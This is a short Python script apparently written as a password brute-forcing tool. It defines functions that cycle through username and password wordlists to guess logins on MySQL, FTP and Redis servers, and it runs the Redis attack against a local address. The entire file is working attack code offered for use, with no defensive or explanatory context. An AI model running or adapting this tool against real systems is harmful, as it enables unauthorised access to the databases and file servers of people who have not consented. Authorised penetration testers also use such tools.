import pymysql
from ftplib import FTP
import redis
def blast_mysql(host,port,user_dict='root',pwd_dict='root'):
    if user_dict == 'root':
        for pwd in open(pwd_dict,'r').readlines():
            pwd = pwd.replace('\n','')
            try:
                db = pymysql.connect(host=host,port=port,user=user_dict,password=pwd)
                db.close()
                return [user_dict,pwd]
            except:
                pass
    elif pwd_dict == 'root':
        for user in open(user_dict, 'r').readlines():
            user = user.replace('\n', '')
            try:
                db = pymysql.connect(host=host, port=port, user=user, password=pwd_dict)
                db.close()
                return [user, pwd_dict]
            except:
                pass
    else:
        for user in open(user_dict, 'r').readlines():
            for pwd in open(pwd_dict, 'r').readlines():
                user = user.replace('\n', '')
                pwd = pwd.replace('\n', '')
                try:
                    db = pymysql.connect(host=host, port=port, user=user, password=pwd)
                    db.close()
                    return [user, pwd]
                except:
                    pass
    return '爆破失败'


def blast_ftp(host,port,user_dict,pwd_dict):
    ftp = FTP()
    for user in open(user_dict, 'r').readlines():
        for pwd in open(pwd_dict, 'r').readlines():
            user = user.replace('\n', '')
            pwd = pwd.replace('\n', '')
            try:
                ftp.connect(host=host, port=port)
                ftp.login(user=user, passwd=pwd)
                return [user, pwd]
            except:
                pass
    return '爆破失败'

def blast_redis(host,port,pwd_dict):
    for pwd in open(pwd_dict, 'r').readlines():
        pwd = pwd.replace('\n', '')
        try:
            red = redis.Redis(host=host, port=port, password=pwd)
            red.info()
            return pwd
        except:
            pass
    return '爆破失败'
# res = blast_mysql('127.0.0.1',3306,pwd_dict='pwd.txt')
# print(res)
# res = blast_ftp('127.0.0.1',21,pwd_dict='pwd.txt',user_dict='users.txt')
# print(res)
res = blast_redis('127.0.0.1',6379,pwd_dict='pwd.txt')
print(res)